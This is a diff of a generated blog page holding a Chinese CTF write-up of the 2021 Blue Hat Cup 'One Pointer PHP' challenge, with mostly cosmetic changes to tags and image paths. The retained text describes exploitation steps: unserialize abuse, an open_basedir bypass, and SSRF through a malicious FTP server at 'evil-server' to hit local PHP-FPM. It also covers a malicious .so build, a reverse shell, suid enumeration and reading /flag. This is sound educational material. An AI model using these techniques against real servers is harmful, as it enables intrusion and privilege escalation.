@@ -46,7 +46,7 @@ if($user=unserialize($_COOKIE[&#34;data&#34;]))&amp;#123;
 
     <script src="./libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="./atom.xml" title="远离尘世的幻想乡" type="application/atom+xml">
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="./atom.xml" title="远离尘世的幻想乡" type="application/atom+xml">
 </head>
 
 
@@ -521,12 +521,12 @@ if($user=unserialize($_COOKIE[&#34;data&#34;]))&amp;#123;
                     
                     <div class="article-tag">
                         
-                            <a href="./tags/CTF/">
-                                <span class="chip bg-color">CTF</span>
-                            </a>
-                        
                             <a href="./tags/Web/">
                                 <span class="chip bg-color">Web</span>
+                            </a>
+                        
+                            <a href="./tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
                             </a>
                         
                             <a href="./tags/disable-function/">
@@ -640,15 +640,15 @@ if($user=unserialize($_COOKIE[&#34;data&#34;]))&amp;#123;
     <span class="token keyword">echo</span> <span class="token string single-quoted-string">'yes'</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920171147429.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920171147429.png"></p>
 <p>序列化一下，打入，结束。</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920171241608.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920171241608.png"></p>
 <p>system被禁了，可惜。</p>
 <p>写个马进去看看。</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920171851484.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920171851484.png"></p>
 <p>天真了，还以为这题就这么简单，是我太天真，试了几个通用的绕过disable_function都不行。</p>
 <p>这有个easy_bypass模块，正常来说应该是把这个模块扒下来pwn掉</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920174534322.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920174534322.png"></p>
 <p>写个open_basedir绕过，然后通过<code>/proc/self/maps</code>查找<code>easy_bypass.so</code>路径</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sandbox/660bef445e619cf44695fec04f93e4f7ff60e252"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -662,23 +662,23 @@ if($user=unserialize($_COOKIE[&#34;data&#34;]))&amp;#123;
 <span class="token comment">//复制文件</span>
 <span class="token comment">//var_dump(copy("/usr/local/lib/php/extensions/no-debug-non-zts-20190902/easy_bypass.so",'/var/www/html/test.so'));</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920174916052.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920174916052.png"></p>
 <p>可惜不会pwn，另寻他法。</p>
 <p>fpm打开的，读取<code>/usr/local/etc/php-fpm.d/www.conf</code>找下监听地址。</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920175059987.png"></p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920175136952.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920175059987.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920175136952.png"></p>
 <p>也可以通过查找<code>/etc/nginx/nginx.conf</code>，发现<code>include /etc/nginx/sites-enabled/*;</code>，然后读取<code>/etc/nginx/sites-enabled/default</code>找到监听地址。</p>
 <blockquote>
 <p>发现 php-fpm 绑定在了本地9001端口上。</p>
 <p>我们可以利用ssrf攻击本地的 php-fpm。我们可以通过在vps上搭建恶意的ftp，骗取目标主机将payload转发到自己的9001端口上，从而执行命令。</p>
 <p>FTP 协议允许通过 TCP 发送二进制数据包，更准确的说是该协议的被动模式，即：如果一个客户端试图从FTP服务器上读取一个文件（或写入），服务器会通知客户端将文件的内容读取（或写）到一个特定的IP和端口上。而且，这里对这些IP和端口没有进行必要的限制。例如，服务器可以告诉客户端连接到自己的某一个端口，如果它愿意的话。</p>
-<p>现在，如果我们传入?file=<a href="ftp://evil-server/file.txt&amp;data=payload%EF%BC%8C%E4%BC%9A%E5%8F%91%E7%94%9F%E4%BB%A5%E4%B8%8B%E6%83%85%E5%86%B5%EF%BC%9A">ftp://evil-server/file.txt&amp;data=payload，会发生以下情况：</a></p>
+<p>现在，如果我们传入?file&#x3D;<a href="ftp://evil-server/file.txt&data=payload%EF%BC%8C%E4%BC%9A%E5%8F%91%E7%94%9F%E4%BB%A5%E4%B8%8B%E6%83%85%E5%86%B5%EF%BC%9A">ftp://evil-server/file.txt&amp;data=payload，会发生以下情况：</a></p>
 <p>首先通过 file_put_contents() 函数连接到我们的FTP服务器，并试图使用 file_put_contents() 把文件上传上去。但是我们搭建的恶意的ftp服务器将告诉它把文件发送到 127.0.0.1:9000。这样，我们就可以向目标主机本地的 PHP-FPM 发送一个任意的数据包，从而执行代码，造成SSRF了。</p>
 <p>摘录自：<a target="_blank" rel="noopener" href="http://www.hackdig.com/05/hack-342091.htm">http://www.hackdig.com/05/hack-342091.htm</a></p>
 </blockquote>
 <p>百度看了下，蚁剑的那个插件需要做些改动就能打了</p>
 <p>试了半天改设置不行，看来只能手动了。</p>
-<h3 id="Fastcgi-PHP-FPM-bypass"><a href="#Fastcgi-PHP-FPM-bypass" class="headerlink" title="Fastcgi/PHP_FPM bypass"></a>Fastcgi/PHP_FPM bypass</h3><h4 id="构造-so"><a href="#构造-so" class="headerlink" title="构造.so"></a>构造.so</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span></span>
+<h3 id="Fastcgi-x2F-PHP-FPM-bypass"><a href="#Fastcgi-x2F-PHP-FPM-bypass" class="headerlink" title="Fastcgi&#x2F;PHP_FPM bypass"></a>Fastcgi&#x2F;PHP_FPM bypass</h3><h4 id="构造-so"><a href="#构造-so" class="headerlink" title="构造.so"></a>构造.so</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
@@ -690,7 +690,7 @@ if($user=unserialize($_COOKIE[&#34;data&#34;]))&amp;#123;
 <p>然后编译一下</p>
 <pre class="line-numbers language-none"><code class="language-none">gcc hpdoger.c -fPIC -shared -o hpdoger.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>之后上传到/tmp</p>
+<p>之后上传到&#x2F;tmp</p>
 <h4 id="开启恶意FTP服务"><a href="#开启恶意FTP服务" class="headerlink" title="开启恶意FTP服务"></a>开启恶意FTP服务</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
 s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
 s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">7777</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#这里是ftp的端口</span>
@@ -1076,9 +1076,9 @@ conn<span class="token punctuation">.</span>close<span class="token punctuation"
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>反弹shell成功</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920200406543.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920200406543.png"></p>
 <p>但权限还不够，需要提权，最常见的是suid提权</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920200510897.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920200510897.png"></p>
 <h4 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h4><blockquote>
 <p>SUID可以让调用者以文件拥有者的身份运行该文件，所以利用SUID提权的思路就是运行root用户所拥有的SUID的文件，那么我们运行该文件的时候就得获得root用户的身份了</p>
 </blockquote>
@@ -1086,16 +1086,16 @@ conn<span class="token punctuation">.</span>close<span class="token punctuation"
 <pre class="line-numbers language-none"><code class="language-none">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>不知道为啥我这找不到</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920201358479.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920201358479.png"></p>
 <p>用张网上的图</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920201437332.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920201437332.png"></p>
 <p>说明<code>/usr/local/bin/php</code>是用root权限且具有suid的。</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920201616574.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920201616574.png"></p>
 <p>然后进入php交互，再利用chdir绕过open_basedir限制，读取flag。</p>
 <pre class="line-numbers language-none"><code class="language-none">php -a
 mkdir(&#39;test&#39;);chdir(&#39;test&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(file_get_contents(&#39;&#x2F;flag&#39;));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920201316794.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920201316794.png"></p>
 
                 
             </div>
@@ -1160,12 +1160,12 @@ mkdir(&#39;test&#39;);chdir(&#39;test&#39;);ini_set(&#39;open_basedir&#39;,&#39;
                     
                         <div class="article-tag">
                             
-                                <a href="./tags/CTF/">
-                                    <span class="chip bg-color">CTF</span>
-                                </a>
-                            
                                 <a href="./tags/Web/">
                                     <span class="chip bg-color">Web</span>
+                                </a>
+                            
+                                <a href="./tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
                                 </a>
                             
                                 <a href="./tags/disable-function/">
@@ -1519,12 +1519,12 @@ mkdir(&#39;test&#39;);chdir(&#39;test&#39;);ini_set(&#39;open_basedir&#39;,&#39;
                 
                 <div class="card-action article-tags">
                     
-                    <a href="./tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
                     <a href="./tags/Web/">
                         <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="./tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
                     </a>
                     
                     <a href="./tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
@@ -1576,12 +1576,12 @@ mkdir(&#39;test&#39;);chdir(&#39;test&#39;);ini_set(&#39;open_basedir&#39;,&#39;
                 
                 <div class="card-action article-tags">
                     
-                    <a href="./tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
                     <a href="./tags/Web/">
                         <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="./tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
                     </a>
                     
                     <a href="./tags/AES/">
